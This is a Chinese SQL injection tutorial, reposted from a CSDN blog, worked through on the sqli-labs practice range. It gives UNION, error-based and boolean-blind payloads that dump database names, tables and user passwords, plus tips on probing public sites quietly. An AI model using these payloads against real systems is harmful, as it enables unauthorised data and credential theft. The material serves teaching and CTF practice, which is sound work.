---
title: sql注入详解
date: 2022-11-26 2:30:00
updated: 2022-11-26 2:58:00
tag: 
  - CTF
  - hack
---

{% note info flat %}本文引用自 [山山而川'blog](https://blog.csdn.net/qq_44159028/article/details/114325805){% endnote %}

***

### 前言

结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。

SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。

**即**：<font  color=BlueViolet>**注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询**</font>

在学习sql注入前，我们需要了解sql语句的基本语法 ——> [mysql基础学习](https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163875545216780269895046%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163875545216780269895046&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-114327303.pc_v2_rank_blog_default&utm_term=mysql&spm=1018.2226.3001.4450)

## 一、漏洞原因分析

我们都知道web分为前端和后端，前端负责进行展示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询

我们可以举一个例子，以[sqli-labs](https://github.com/Audi-1/sqli-labs)第一关为例，按要求在url后面加上?id=1，显示如下

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B1.png)

当我们改变id的值为2是，页面发生了改变。说明它将我们输入的数据代入到了数据中进行查询，页面根据输入数据的不同展示的内容也不同。

ps：url中?代表传值的意思，id代表变量，后面的"="代表变量的值

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B2.png)

为了更清楚的看清sql语句的执行与变化过程，我们先修改源代码，打开Less-1/index.php，在源码中添加如下语句将执行的sql语句打印出来，方便我们查看

```php
echo '执行的sql语句为：'.$sql;
echo '<br/>';
echo '<br/>';
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B3.png)

访问页面如下，打印出了执行的sql语句

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B4.png)

在1后面加上单引号, ?id=1'，页面显示有语法错误，说靠近 '1'' limit 0,1有语法错误，我们输入的数据 1' 被完整的带入到了SQL语句中，即直接与原有的sql语句进行了拼接。然后执行的sql语句变成了

```php
$sql="SELECT * FROM users WHERE id='  1 ' ' LIMIT 0,1";
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B5.png)

我们输入的那个单引号和前面的单引号产生了闭合，导致原有后面的那个单引号变成了多余，而sql语法中引号是必须成对出现的否则就会报错。

既然输入的单引号成了多余也就证明程序没有对我们的输入进行过滤，那我们就构造语句将单引号进行闭合就好了。我们在1后面加上单引号，与前面的引号构成闭合，再接着在后面插入我们自己想要查询的语句就可以查询我们想要查询的数据，就这样被脱库的风险就悄悄的发生。

## 二、漏洞危害

SQL注入漏洞对于数据安全的影响：

* **数据库信息泄漏：**数据库中存放的用户的隐私信息的泄露。
* **网页篡改：**通过操作数据库对特定网页进行篡改。
* **网站被挂马，传播恶意软件：**修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
* **数据库被恶意操作：**数据库服务器被攻击，数据库的系统管理员帐户被窜改。
* **服务器被远程控制，被安装后门：**经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
* **破坏硬盘数据，瘫痪全系统。**

## 三、sql注入防范

解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：

代码层面：

  1. 对输入进行严格的转义和过滤
  2. 使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了"拼接"的方式,所以使用时需要慎重!
  3. PDO预处理 (Java、PHP防范推荐方法：)

⛔没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入

网络层面：

  1. 通过WAF设备启用防SQL Inject注入策略（或类似防护系统）
  2. 云端防护（如阿里云盾）

## 四、如何挖掘sql注入漏洞

#### 1. 注入可能存在的地方

既然是sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id=1

如我们看见这种就可以考虑
![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612195905209.png)

或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612200112789.png)

或者是HTTP请求头部字段如Cookie值，下面会讲到。

#### 2. 漏洞探测

此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试
```
#判断如下闭合方式是否会报错，会报错则肯定存在注入
=test'                         
=test"                         
#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞
=test' and -1=-1 or '
=test' and -1=-2 or '  
         
=test" and -1=-1 or "
=test" and -1=-2 or "
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612200244975.png)

ps：目前网站的sql注入基本都能通过漏洞扫描器xray检测出来 ——> xray与burp联动，但是这样动静太大（公网上），如果在内网中可以直接挂上xray进行检测。所以在公网时可以手动检测是否存在漏洞，然后在存在漏洞的地方打上*，接着复制整个请求包在txt文档中用sqlmap -r进行注入 ——> sqlmap -r

补充：

*get型*

1. 进行url编码

在url中进行测试payload需要先进行url编码

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612205739314.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612205903343.png)

不进行编码的话，也可以用+代替空格，#代替--+ 。 %23代表#，也是注释符

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612210342291.png)

*post型*

如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210612211327475.png)

## 五、常见的注入手法
SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。

*<font color=purple>参数类型分类</font>*

1. 数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

如 www.text.com/text.php?id=3 对应的sql语句为 select * from table where id=3

2. 字符型：字符型注入正好相反

当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹

例如数字型语句：select * from table where id =3

则字符型如下：select * from table where name=’admin’

*<font color=purple>注入手法分类</font>*

@   UNION query SQL injection（联合查询注入）
@   Error-based SQL injection（错型注入）
@   Boolean-based blind SQL injection（基于布尔的盲注）
@   Time-based blind SQL injection（基于时间的盲注）
@   Stacked queries SQL injection（可多语句查询注入）

为了练习sql注入，我们使用sqli-labs靶场进行sql注入学习，网上有很多安装教程这里就不演示了。建议学这个之前先学习mysql语法，不然理解不了sql语句

### 联合查询(union注入)

<font color=red>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</font>

漏洞靶场实战，传送门 -》[webug 4.0 第一关 显错注入](https://blog.csdn.net/qq_44159028/article/details/115969983)

我们以sqli-labs第一关为例来学习联合查询。如下，要求我们传入一个id值过去

传参?id=1

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210303182305532.png)

1. 页面观察

当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了

2. 注入点判断

开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210303182730727.png)

继续判断 

?id=1' and 1=1 --+   页面正常显示   传送门 -》[关于sql注入中的 --+](https://blog.csdn.net/qq_44159028/article/details/114808681)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314225806936.png)

?id=1' and 1=2 --+  页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314225831842.png)

3. 判断当前表的字段个数

```
?id=1 order by 3 --+   
```

传送门 -》[关于order by](https://blog.csdn.net/qq_44159028/article/details/114809458) 

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314232328721.png)

?id=1 order by 4 --+ ,此时显示未知的列，说明此时当前表中只有3列

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314232352443.png)

4. 判断显示位

上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显

```
?id=-1' union select 1,2,3 --+ 
```

让union select前面的参数查不出来，所以id=-1'

如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210314233755850.png)

5. 爆数据库名字

```
?id=-1' union select 1,database(),3 --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315143610789.png)

6. 爆数据库中的表

```
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

其中爆出来数据库中存在三个表

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315225817625.png)

7. 爆表中的字段

我们这里选择一个表，users进行进一步的获取表中的字段值

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

获取到三个字段，分别为id,username,password

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210315230239161.png)

8. 爆相应字段的所有数据

```
?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/202103152309268.png)

至此，一次完整的脱库过程结束了，联合查询也就结束了。

### 报错注入

>   报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。
>   报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。
>   推荐三种报错注入的方法，直接套用就行。以less-1为例子

#### 1. group by 重复键冲
   
```
and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
```

提交如下，获取数据库名字

```
?id=1' and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316093930798.png)

#### 2. extractvalue() 函数

```
?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+
```

提交 ?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+  获取数据库名字

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316094306845.png)

#### 3. updatexml() 函数

```
and updatexml(1,concat('^',(需要查询的内容),'^'),1)
```

1. 提交如下，获取数据库名字

```
?id=1' and updatexml(1,concat('^',(database()),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021031609453822.png)

2. 获取当前数据库中表的名字

```
?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316094730140.png)

这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema='security' 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095213384.png)


如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users

3. 爆表中的字段

```
?id=1' and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+
```

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095511672.png)

总共爆出的字段为： id , username , password

4. 爆字段中的内容

```
?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+
```

三组用户名和密码。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316095719686.png)

### 基于布尔的盲注

布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例

1. 我们输入正确的id，显示You are in .....

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021031617333684.png)

我们输入错误的语句如id=1' ，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316173450459.png)

源码如下

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1 ";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
 
	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
    echo '<font size="5" color="#FFFF00">';
    ｝
```

所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316182126690.png)

1. 判断数据库类型

* MySQL数据库表     information_schema.tables
* access            msysobjects 
* SQLServer         sysobjects
用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库

```sql
//判断是否是 Mysql数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from information_schema.tables) --+
//判断是否是 access数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from msysobjects) --+
//判断是否是 Sqlserver数据库
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) --+
```
![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316174105779.png)

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210316174130279.png)

所以当前数据库为mysql数据库

2. 判断当前数据库名

```sql
1：判断当前数据库的长度，利用二分法
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>5 --+  //正常显示
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>10 --+  //不显示任何数据
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>7 --+  //正常显示
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>8 --+  //不显示任何数据
 
  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符
 
2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断
//判断数据库的第一个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>115 --+ //100为ascii表中的十进制，对应字母s
//判断数据库的第二个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100 --+
//判断数据库的第三个字符
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),3,1))>100 --+
...........
由此可以判断出当前数据库为 security
```

3. 判断当前库的表名

```sql
//猜测当前数据库中是否存在admin表
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin) --+
1：判断当前数据库中表的个数
// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>3 --+
 
2：判断每个表的长度
//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>6 --+
//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+
 
3：判断每个表的每个字符的ascii值
//判断第一个表的第一个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+
//判断第一个表的第二个字符的ascii值               
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 --+
.........
由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
```

4. 判断表的字段

* 判断字段个数
* 判断每个字段的长度
* 猜每个字段的字符

```sql
//如果已经证实了存在admin表，那么猜测是否存在username字段
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select username from admin) 
  
1：判断表中字段的个数
//判断users表中字段个数是否大于5
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(column_name) from information_schema.columns where table_name='users' and table_schema='security')>5 --+
 
2：判断每个字段的长度
//判断第一个字段的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5 --+
//判断第二个字段的长度   
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))>5 --+
 
3：判断每个字段名字的ascii值
//判断第一个字段的第一个字符的ascii
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --+
//判断第一个字段的第二个字符的ascii
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))>100 --+
...........
 
由此可判断出users表中存在 id、username、password 字段
```

5. 爆字段中的数据

* 猜字段中数据的长度
* 猜字段数据的每个字符ascii码 得字符

```sql
我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据
 
1: 判断数据的长度
// 判断id字段的第一个数据的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5 --+
// 判断id字段的第二个数据的长度
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5 --+
 
2：判断数据的ascii值
// 判断id字段的第一行数据的第一个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit  0,1),1,1))>100 --+
// 判断id字段的第二行数据的第二个字符的ascii值
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100 --+
...........
```

一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。